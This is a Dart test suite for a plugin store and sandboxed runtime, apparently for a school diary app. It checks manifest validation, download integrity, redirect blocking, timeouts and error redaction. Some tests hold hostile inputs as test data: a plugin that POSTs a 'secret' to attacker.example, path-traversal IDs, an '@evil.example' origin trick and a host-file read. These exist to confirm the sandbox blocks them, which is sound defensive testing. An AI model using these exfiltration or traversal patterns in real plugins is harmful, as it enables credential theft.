import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:crypto/crypto.dart';
import 'package:dart_eval/dart_eval.dart';
import 'package:dio/dio.dart';
import 'package:siberia_plugins/siberia_plugins.dart';
import 'package:test/test.dart';

class MemoryHttp implements HttpClientAdapter {
  MemoryHttp(this.respond);
  final ResponseBody Function(RequestOptions request) respond;
  final requests = <RequestOptions>[];
  @override
  Future<ResponseBody> fetch(
    RequestOptions options,
    Stream<Uint8List>? requestStream,
    Future<void>? cancelFuture,
  ) async {
    requests.add(options);
    return respond(options);
  }

  @override
  void close({bool force = false}) {}
}

void main() {
  late Directory directory;
  late Uint8List bytecode;
  late PluginManifest manifest;
  late MemoryHttp network;
  late PluginStore store;

  Uint8List compile(String source) => Uint8List.fromList(
    Compiler().compile({
      'diary': {'main.dart': source},
    }).write(),
  );

  PluginManifest release(Uint8List bytes) => PluginManifest.fromJson({
    'id': 'test-diary',
    'name': 'Test diary',
    'version': '1.0.0',
    'apiVersion': 1,
    'runtime': pluginRuntimeVersion,
    'artifact': 'test-diary/1.0.0/plugin.evc',
    'sha256': sha256.convert(bytes).toString(),
    'bytes': bytes.length,
    'operations': ['echo', 'sync'],
    'origins': ['https://school.example'],
  });

  setUpAll(() {
    bytecode = compile(File('../examples/echo/main.dart').readAsStringSync());
    manifest = release(bytecode);
  });
  setUp(() async {
    directory = await Directory.systemTemp.createTemp('siberia-plugin-test-');
    network = MemoryHttp((request) => ResponseBody.fromBytes(bytecode, 200));
    store = PluginStore(
      directory: directory,
      client: Dio()..httpClientAdapter = network,
    );
  });
  tearDown(() async => directory.delete(recursive: true));

  Matcher code(String value) =>
      isA<PluginException>().having((error) => error.code, 'code', value);

  test('repository catalog parses and never bundles Librus', () {
    final catalog = parsePluginCatalog(
      jsonDecode(File('../catalog.json').readAsStringSync()),
    );
    expect(catalog.any((entry) => entry.id == 'librus'), isFalse);
  });

  test('manifest round trip; rejects incompatible and unsafe releases', () {
    expect(
      PluginManifest.fromJson(manifest.toJson()).toJson(),
      manifest.toJson(),
    );
    for (final patch in [
      {'id': '../outside'},
      {'id': 'librus'},
      {'artifact': 'https://other.example/plugin.evc'},
      {'artifact': 'test-diary/1.0.0/../plugin.evc'},
      {'sha256': 'not-a-hash'},
      {'bytes': pluginMaxBytes + 1},
      {
        'origins': ['https://school.example/secret'],
      },
      {
        'origins': ['http://school.example'],
      },
      {
        'origins': ['https://school.example@evil.example'],
      },
      {
        'origins': ['https://127.0.0.1'],
      },
      {
        'origins': ['https://localhost'],
      },
      {'runtime': 'future-vm'},
      {'apiVersion': 2},
    ]) {
      expect(
        () => PluginManifest.fromJson({...manifest.toJson(), ...patch}),
        throwsA(isA<PluginException>()),
      );
    }
    expect(
      () => parsePluginCatalog({
        'schemaVersion': 1,
        'plugins': [manifest.toJson(), manifest.toJson()],
      }),
      throwsA(code('duplicate_plugin')),
    );
  });

  test(
    'concurrent installs download once and reuse the release offline',
    () async {
      final installs = await Future.wait([
        store.install(manifest),
        store.install(manifest),
      ]);
      expect(installs.first.bytecode, bytecode);
      expect(network.requests, hasLength(1));
      network = MemoryHttp((_) => throw StateError('offline'));
      final offline = PluginStore(
        directory: directory,
        client: Dio()..httpClientAdapter = network,
      );
      expect((await offline.install(manifest)).bytecode, bytecode);
      expect(network.requests, isEmpty);
      expect(
        directory.listSync(recursive: true).whereType<File>(),
        hasLength(1),
      );
    },
  );

  test('tampering and partial downloads do not install bytes', () async {
    final client = Dio()
      ..httpClientAdapter = MemoryHttp(
        (_) => ResponseBody.fromBytes(List.filled(bytecode.length, 0), 200),
      );
    final badStore = PluginStore(directory: directory, client: client);
    await expectLater(
      badStore.install(manifest),
      throwsA(code('integrity_failed')),
    );
    expect(directory.listSync(recursive: true), isEmpty);
    client.httpClientAdapter = MemoryHttp(
      (_) => ResponseBody.fromBytes(bytecode.sublist(1), 200),
    );
    await expectLater(
      badStore.install(manifest),
      throwsA(code('integrity_failed')),
    );
    expect((await store.install(manifest)).bytecode, bytecode);
  });

  test('corrupt installed bytes are rechecked and repaired', () async {
    await store.install(manifest);
    final file = directory.listSync(recursive: true).whereType<File>().single;
    await file.writeAsBytes(List.filled(bytecode.length, 0));
    expect((await store.install(manifest)).bytecode, bytecode);
    expect(network.requests, hasLength(2));
  });

  test('oversized responses and download redirects are rejected', () async {
    final client = Dio()
      ..httpClientAdapter = MemoryHttp(
        (_) => ResponseBody.fromBytes(List.filled(bytecode.length + 1, 0), 200),
      );
    final badStore = PluginStore(directory: directory, client: client);
    await expectLater(
      badStore.install(manifest),
      throwsA(code('download_too_large')),
    );
    client.httpClientAdapter = MemoryHttp((request) {
      expect(request.followRedirects, isFalse);
      return ResponseBody.fromString(
        '',
        302,
        headers: {
          'location': ['https://other.example'],
        },
      );
    });
    await expectLater(
      badStore.install(manifest),
      throwsA(code('download_failed')),
    );
  });

  test('catalog is fetched from /plugins/ and validated', () async {
    network = MemoryHttp((request) {
      expect(
        request.uri.toString(),
        '${PluginStore.productionSource}catalog.json',
      );
      return ResponseBody.fromString(
        jsonEncode({
          'schemaVersion': 1,
          'plugins': [manifest.toJson()],
        }),
        200,
      );
    });
    final catalog = await PluginStore(
      directory: directory,
      client: Dio()..httpClientAdapter = network,
    ).catalog();
    expect(catalog.single.id, manifest.id);
  });

  test('bytecode executes offline with isolated account state', () async {
    final installed = await store.install(manifest);
    final runtime = PluginRuntime();
    final results = await Future.wait([
      runtime.invoke(
        installed,
        operation: 'echo',
        input: {'grade': 5},
        state: {'account': 'a'},
      ),
      runtime.invoke(
        installed,
        operation: 'echo',
        input: {'grade': 3},
        state: {'account': 'b'},
      ),
    ]);
    expect(results.first.data, {'grade': 5});
    expect(results.first.state, {'account': 'a'});
    expect(results.last.data, {'grade': 3});
    expect(results.last.state, {'account': 'b'});
    await expectLater(
      runtime.invoke(installed, operation: 'unknown'),
      throwsA(code('unsupported_operation')),
    );
  });

  test(
    'HTTP bridge keeps status, raw body, and headers; disables redirects',
    () async {
      final bytes = compile('''
      import 'dart:convert';
      Future<String> main(String request, Function http) async {
        final response = await http(jsonEncode({
          'url': 'https://school.example/api', 'method': 'POST',
          'headers': {'Authorization': 'Bearer synthetic-token'},
          'body': '{"password":"  unchanged  "}'
        }));
        return jsonEncode({'data': jsonDecode(response), 'state': {}});
      }
    ''');
      final artifactNetwork = MemoryHttp(
        (_) => ResponseBody.fromBytes(bytes, 200),
      );
      final installed = await PluginStore(
        directory: directory,
        client: Dio()..httpClientAdapter = artifactNetwork,
      ).install(release(bytes));
      final school = MemoryHttp((request) {
        expect(request.followRedirects, isFalse);
        expect(request.method, 'POST');
        expect(request.data, '{"password":"  unchanged  "}');
        expect(request.headers['Authorization'], 'Bearer synthetic-token');
        return ResponseBody.fromString(
          'maintenance',
          503,
          headers: {
            'x-test': ['one'],
          },
        );
      });
      final result = await PluginRuntime(
        client: Dio()..httpClientAdapter = school,
      ).invoke(installed, operation: 'sync');
      expect(result.data, {
        'status': 503,
        'headers': {
          'x-test': ['one'],
        },
        'body': 'maintenance',
      });
    },
  );

  test(
    'plugin cannot exfiltrate credentials to an undeclared origin',
    () async {
      final bytes = compile('''
      Future<String> main(String request, Function http) async {
        await http('{"url":"https://attacker.example/","method":"POST","body":"secret"}');
        return '{"data":[],"state":{}}';
      }
    ''');
      final installed = await PluginStore(
        directory: directory,
        client: Dio()
          ..httpClientAdapter = MemoryHttp(
            (_) => ResponseBody.fromBytes(bytes, 200),
          ),
      ).install(release(bytes));
      final school = MemoryHttp((_) => throw StateError('must not be reached'));
      await expectLater(
        PluginRuntime(
          client: Dio()..httpClientAdapter = school,
        ).invoke(installed, operation: 'sync'),
        throwsA(code('http_failed')),
      );
      expect(school.requests, isEmpty);
    },
  );

  test('infinite plugin loop is killed without blocking the host', () async {
    final bytes = compile('''
      String main(String request, Function http) {
        while (true) {}
        return '';
      }
    ''');
    final installed = await PluginStore(
      directory: directory,
      client: Dio()
        ..httpClientAdapter = MemoryHttp(
          (_) => ResponseBody.fromBytes(bytes, 200),
        ),
    ).install(release(bytes));
    await expectLater(
      PluginRuntime().invoke(
        installed,
        operation: 'sync',
        timeout: const Duration(milliseconds: 200),
      ),
      throwsA(code('execution_timeout')),
    );
    final good = await store.install(manifest);
    expect(
      (await PluginRuntime().invoke(
        good,
        operation: 'echo',
        input: {'alive': true},
      )).data,
      {'alive': true},
    );
  });

  test('VM failures are redacted and reject invalid envelopes', () async {
    for (final source in [
      "String main(String request, Function http) { throw 'private-password'; }",
      "String main(String request, Function http) { return '{}'; }",
    ]) {
      final bytes = compile(source);
      final installed = await PluginStore(
        directory: directory,
        client: Dio()
          ..httpClientAdapter = MemoryHttp(
            (_) => ResponseBody.fromBytes(bytes, 200),
          ),
      ).install(release(bytes));
      await expectLater(
        PluginRuntime().invoke(installed, operation: 'echo'),
        throwsA(
          isA<PluginException>().having(
            (error) => error.toString(),
            'safe error',
            isNot(contains('private-password')),
          ),
        ),
      );
    }
  });
  test('VM cannot read host files without a granted permission', () async {
    final secret = File('${directory.path}/private.txt');
    await secret.writeAsString('private-test-value');
    final bytes = compile("""
      import 'dart:io';
      String main(String request, Function http) {
        return File('${secret.path}').readAsStringSync();
      }
    """);
    final installed = await PluginStore(
      directory: directory,
      client: Dio()
        ..httpClientAdapter = MemoryHttp(
          (_) => ResponseBody.fromBytes(bytes, 200),
        ),
    ).install(release(bytes));
    await expectLater(
      PluginRuntime().invoke(installed, operation: 'echo'),
      throwsA(code('execution_failed')),
    );
  });

  test(
    'a failed upgrade leaves the installed release usable offline',
    () async {
      await store.install(manifest);
      final update = PluginManifest.fromJson({
        ...manifest.toJson(),
        'version': '1.1.0',
        'artifact': 'test-diary/1.1.0/plugin.evc',
      });
      final broken = PluginStore(
        directory: directory,
        client: Dio()
          ..httpClientAdapter = MemoryHttp(
            (_) => ResponseBody.fromBytes([0], 200),
          ),
      );
      await expectLater(
        broken.install(update),
        throwsA(code('integrity_failed')),
      );
      final old = await broken.install(manifest);
      expect(
        (await PluginRuntime().invoke(
          old,
          operation: 'echo',
          input: {'offline': true},
        )).data,
        {'offline': true},
      );
    },
  );

  test(
    'release tool packages executable bytes and refuses overwrite',
    () async {
      final source = Directory('${directory.path}/source')..createSync();
      final src = Directory('${source.path}/src')..createSync();
      File('${src.path}/main.dart').writeAsStringSync(
        File('../examples/echo/main.dart').readAsStringSync(),
      );
      File('${source.path}/plugin.json').writeAsStringSync(
        jsonEncode({
          'id': 'test-diary',
          'name': 'Test diary',
          'version': '1.0.0',
          'operations': ['echo'],
          'origins': <String>[],
        }),
      );
      final output = '${directory.path}/test-diary/1.0.0';
      final args = [
        '--suppress-analytics',
        'run',
        'tool/package_plugin.dart',
        source.path,
        output,
      ];
      final result = await Process.run(Platform.resolvedExecutable, args);
      expect(result.exitCode, 0, reason: result.stderr.toString());
      final release = PluginManifest.fromJson(
        jsonDecode(File('$output/manifest.json').readAsStringSync()),
      );
      File('${directory.path}/catalog.json').writeAsStringSync(
        jsonEncode({
          'schemaVersion': 1,
          'plugins': [release.toJson()],
        }),
      );
      final validation = await Process.run(Platform.resolvedExecutable, [
        '--suppress-analytics',
        'run',
        'tool/validate_catalog.dart',
        directory.path,
      ]);
      expect(validation.exitCode, 0, reason: validation.stderr.toString());
      expect(
        (await Process.run(Platform.resolvedExecutable, args)).exitCode,
        1,
      );
      final installed = await PluginStore(
        directory: Directory('${directory.path}/cache'),
        client: Dio()
          ..httpClientAdapter = MemoryHttp(
            (_) => ResponseBody.fromBytes(
              File('$output/plugin.evc').readAsBytesSync(),
              200,
            ),
          ),
      ).install(release);
      expect(
        (await PluginRuntime().invoke(
          installed,
          operation: 'echo',
          input: {'packaged': true},
        )).data,
        {'packaged': true},
      );
    },
  );
}
